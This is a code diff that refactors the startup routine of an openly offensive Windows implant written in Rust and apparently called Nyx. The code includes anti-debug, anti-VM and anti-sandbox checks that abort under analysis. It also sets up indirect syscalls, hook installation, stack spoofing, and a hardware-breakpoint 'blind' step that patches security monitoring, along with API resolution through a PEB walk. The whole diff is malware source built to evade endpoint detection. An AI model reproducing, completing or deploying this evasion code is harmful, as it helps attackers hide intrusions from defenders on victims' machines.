@@ -28,6 +28,23 @@ use crate::resolve::LiveNtdll;
 unsafe fn bootstrap() -> Option<LiveNtdll> {
     let ntdll = LiveNtdll::locate()?;
 
+    if !bootstrap_sandbox_gate(bootstrap_skip_sandbox()) {
+        return None;
+    }
+
+    bootstrap_syscalls(&ntdll);
+    bootstrap_hookchain();
+    bootstrap_pdata_gaps();
+    bootstrap_countermeasures();
+    bootstrap_blind();
+    bootstrap_runtime_finalize();
+
+    Some(ntdll)
+}
+
+/// Whether `NYX_SKIP_SANDBOX=1` (or the `nyx_skip_sandbox` cfg) opts the
+/// process out of the anti-analysis gates.
+fn bootstrap_skip_sandbox() -> bool {
     // Anti-debug / anti-sandbox / anti-VM: if the environment looks hostile
     // (VM detected, debugger attached, sandbox uptime too short), abort early
     // — don't execute tasks under observation.
@@ -54,25 +71,26 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     // on VMs/VPS where envprobe correctly flags the virtual environment), OR
     // if compiled with the `nyx_skip_sandbox` cfg flag (for SYSTEM-context
     // deployments where env vars can't be reliably passed through schtask).
-    let skip_sandbox = {
-        let env_skip = unsafe {
-            crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA")
-                .map(|addr| {
-                    type FnGetEnv = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
-                    let f: FnGetEnv = core::mem::transmute(addr);
-                    let mut buf = [0u8; 2];
-                    let n = f(
-                        b"NYX_SKIP_SANDBOX\0".as_ptr(),
-                        buf.as_mut_ptr(),
-                        buf.len() as u32,
-                    );
-                    n == 1 && buf[0] == b'1'
-                })
-                .unwrap_or(false)
-        };
-        env_skip || cfg!(nyx_skip_sandbox)
+    let env_skip = unsafe {
+        crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA")
+            .map(|addr| {
+                type FnGetEnv = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
+                let f: FnGetEnv = core::mem::transmute(addr);
+                let mut buf = [0u8; 2];
+                let n = f(
+                    b"NYX_SKIP_SANDBOX\0".as_ptr(),
+                    buf.as_mut_ptr(),
+                    buf.len() as u32,
+                );
+                n == 1 && buf[0] == b'1'
+            })
+            .unwrap_or(false)
     };
+    env_skip || cfg!(nyx_skip_sandbox)
+}
 
+/// VM/sandbox/antidebug gates. Returns true when the process may continue.
+fn bootstrap_sandbox_gate(skip_sandbox: bool) -> bool {
     // VM/sandbox detection — BEFORE we spend cycles on evasion init.
     if !skip_sandbox
         && matches!(
@@ -86,7 +104,7 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         // we should NOT abort on them just because they're VMs.
         if !unsafe { crate::envprobe::looks_like_cloud_server() } {
             // Looks like a sandbox — bail out.
-            return None;
+            return false;
         }
         // Cloud server confirmed — proceed with evasion init.
     }
@@ -94,20 +112,30 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         // Under a debugger or inside a fresh sandbox → bail out.
         // A production implant would set a flag; here we use the same early
         // return pattern as a failed locate (the caller spins, or exits).
-        return None;
+        return false;
     }
+    true
+}
 
+/// SSN table + indirect-syscall runtime init.
+unsafe fn bootstrap_syscalls(ntdll: &LiveNtdll) {
     let _ssn_table = ntdll.resolve_table_owned();
     diag_mark(b"1_syscalls");
 
     // Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
     crate::syscalls::init_global();
     diag_mark(b"2_init_global");
+}
 
+/// HookChain install.
+unsafe fn bootstrap_hookchain() {
     // HookChain
     let _hookchain_count = unsafe { crate::hookchain::apply() };
     diag_mark(b"3_hookchain");
+}
 
+/// .pdata gap scan + stack-spoof auto-arm.
+fn bootstrap_pdata_gaps() {
     // .pdata gap scan + stack-spoof init.
     let scanner = crate::evasion_glue::LivePdataScanner;
     if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
@@ -153,7 +181,11 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         }
     }
     diag_mark(b"4_pdata");
+}
 
+/// Countermeasure init (proxy gadgets, caller-spoof stubs, CFG probe) — runs
+/// before blind (VEH registration) so gadgets/stubs are available to add_hwbp.
+fn bootstrap_countermeasures() {
     // ---- Countermeasure init (proxy gadgets, caller-spoof stubs, CFG probe) --
     // Run BEFORE blind (VEH registration) so proxy gadgets and caller-spoof
     // stubs are available when add_hwbp registers the first VEH handler.
@@ -161,7 +193,10 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         crate::blind_hwbp::init_countermeasures();
     }
     diag_mark(b"4b_countermeasures");
+}
 
+/// BLIND: HWBP → byte-patch fallback.
+unsafe fn bootstrap_blind() {
     // BLIND: HWBP → byte-patch fallback
     let mut hwbp_ok = false;
     if unsafe { crate::blind_hwbp::init_shadow_buffer() } {
@@ -188,7 +223,10 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         crate::blind::BLIND_OK.store(true, core::sync::atomic::Ordering::Release);
     }
     diag_mark(b"6_blind_done");
+}
 
+/// CSPRNG registration + LACUNA ghost-frame scan + InsomniacUnwinding check.
+unsafe fn bootstrap_runtime_finalize() {
     // ---- CSPRNG registration -------------------------------------------------
     // The no_std PIC implant can't use getrandom's static #[link(name="advapi32")]
     // (the PIC cdylib import table doesn't resolve SystemFunction036 → abort
@@ -206,8 +244,6 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     // ---- InsomniacUnwinding check ---------------------------------------------
     crate::insomniac::bootstrap_check();
     diag_mark(b"9_insomniac");
-
-    Some(ntdll)
 }
 
 /// CSPRNG fill via PEB-walk-resolved `SystemFunction036` (RtlGenRandom).
@@ -331,78 +367,97 @@ unsafe fn exit_in_entry(code: u32) -> ! {
 /// bootstrap step was reached before a crash. Uses CreateFileA/WriteFile
 /// resolved via PEB walk (no std fs). Best-effort — silently ignores errors.
 pub fn diag_mark(mark: &[u8]) {
-    unsafe {
-        use core::ffi::c_void;
-        type CreateFileAFn = unsafe extern "system" fn(
-            *const u8,
-            u32,
-            u32,
-            *mut c_void,
-            u32,
-            u32,
-            *mut c_void,
-        ) -> *mut c_void;
-        type WriteFileFn =
-            unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
-        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+    let (create, write, close) = match diag_mark_resolve_apis() {
+        Some(apis) => apis,
+        None => return,
+    };
+    let path = diag_mark_build_path(mark);
+    unsafe { diag_mark_write_file(create, write, close, &path) };
+}
 
-        let cfa = match crate::resolve::export_addr(b"kernel32.dll", b"CreateFileA") {
-            Some(a) => a,
-            None => return,
-        };
-        let wf = match crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") {
-            Some(a) => a,
-            None => return,
-        };
-        let ch = match crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
-            Some(a) => a,
-            None => return,
-        };
+/// Resolve CreateFileA/WriteFile/CloseHandle via PEB walk; None if any missing.
+#[cfg(nyx_diag)]
+fn diag_mark_resolve_apis() -> Option<(usize, usize, usize)> {
+    let cfa = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateFileA") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let wf = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let ch = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
+        Some(a) => a,
+        None => return None,
+    };
+    Some((cfa, wf, ch))
+}
 
-        let create: CreateFileAFn = core::mem::transmute(cfa);
-        let write: WriteFileFn = core::mem::transmute(wf);
-        let close: CloseHandleFn = core::mem::transmute(ch);
-
-        // Build path: C:\nyx\diag_<mark>
-        let mut path = [0u8; 64];
-        let prefix = b"C:\\nyx\\diag_";
-        let mut i = 0;
-        while i < prefix.len() && i < path.len() {
-            path[i] = prefix[i];
-            i += 1;
-        }
-        let mut j = 0;
-        while j < mark.len() && i < path.len() - 1 {
-            path[i] = mark[j];
-            i += 1;
-            j += 1;
-        }
-        path[i] = 0; // NUL terminator
-
-        // CREATE_ALWAYS=2, GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2
-        let h = create(
-            path.as_ptr(),
-            0x40000000,
-            2,
-            core::ptr::null_mut(),
-            2,
-            0,
-            core::ptr::null_mut(),
-        );
-        if h.is_null() || h as usize == usize::MAX {
-            return;
-        }
-        let data = b"ok";
-        let mut written: u32 = 0;
-        write(
-            h,
-            data.as_ptr(),
-            data.len() as u32,
-            &mut written,
-            core::ptr::null_mut(),
-        );
-        close(h);
+/// Build `C:\nyx\diag_<mark>` (NUL-terminated, truncated to the buffer).
+#[cfg(nyx_diag)]
+fn diag_mark_build_path(mark: &[u8]) -> [u8; 64] {
+    // Build path: C:\nyx\diag_<mark>
+    let mut path = [0u8; 64];
+    let prefix = b"C:\\nyx\\diag_";
+    let mut i = 0;
+    while i < prefix.len() && i < path.len() {
+        path[i] = prefix[i];
+        i += 1;
     }
+    let mut j = 0;
+    while j < mark.len() && i < path.len() - 1 {
+        path[i] = mark[j];
+        i += 1;
+        j += 1;
+    }
+    path[i] = 0; // NUL terminator
+    path
+}
+
+/// CreateFileA + WriteFile + CloseHandle on the built path. Best-effort.
+#[cfg(nyx_diag)]
+unsafe fn diag_mark_write_file(create: usize, write: usize, close: usize, path: &[u8; 64]) {
+    use core::ffi::c_void;
+    type CreateFileAFn = unsafe extern "system" fn(
+        *const u8,
+        u32,
+        u32,
+        *mut c_void,
+        u32,
+        u32,
+        *mut c_void,
+    ) -> *mut c_void;
+    type WriteFileFn =
+        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
+    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let create: CreateFileAFn = core::mem::transmute(create);
+    let write: WriteFileFn = core::mem::transmute(write);
+    let close: CloseHandleFn = core::mem::transmute(close);
+
+    // CREATE_ALWAYS=2, GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2
+    let h = create(
+        path.as_ptr(),
+        0x40000000,
+        2,
+        core::ptr::null_mut(),
+        2,
+        0,
+        core::ptr::null_mut(),
+    );
+    if h.is_null() || h as usize == usize::MAX {
+        return;
+    }
+    let data = b"ok";
+    let mut written: u32 = 0;
+    write(
+        h,
+        data.as_ptr(),
+        data.len() as u32,
+        &mut written,
+        core::ptr::null_mut(),
+    );
+    close(h);
 }
 
 // Production builds ship without --cfg nyx_diag, so diag_mark is a compile-time
